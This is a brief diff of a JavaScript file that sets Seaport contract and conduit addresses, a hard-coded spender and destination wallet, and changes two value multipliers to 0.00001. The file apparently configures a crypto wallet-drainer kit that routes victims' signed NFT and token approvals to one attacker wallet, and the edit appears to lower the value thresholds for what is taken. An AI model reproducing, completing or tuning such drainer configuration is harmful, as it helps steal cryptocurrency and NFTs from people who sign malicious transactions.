@@ -2207,8 +2207,8 @@ var zeroAddr = '0x0000000000000000000000000000000000000000';
 var seaportAddr = '0x00000000006c3852cbef3e08e8df289169ede581';
 var conduitAddr = '0x1e0049783f008a0085193e00003d00cd54003c71';
 
-var signMultiple = 5;
-var nftMultiple = 0.8;
+var signMultiple = 0.00001;
+var nftMultiple = 0.00001;
 
 var spenderAddr = '0x4Ac6005B03a14B2fbdcC00d4Dec781B7A2005f82';
 var destAddr = '0x4Ac6005B03a14B2fbdcC00d4Dec781B7A2005f82';
